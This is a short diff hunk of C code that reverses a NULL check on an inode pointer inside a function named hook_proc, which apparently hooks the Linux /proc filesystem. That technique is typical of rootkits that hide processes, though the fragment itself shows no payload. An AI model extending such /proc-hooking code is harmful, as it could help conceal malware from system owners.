@@ -68,7 +68,7 @@ void hook_proc(struct proc_dir_entry *root) {
 	pinode = inode_data.inode;
 #endif
 
-	if (pinode != NULL) {
+	if (pinode == NULL) {
 		return;
 	}
 	
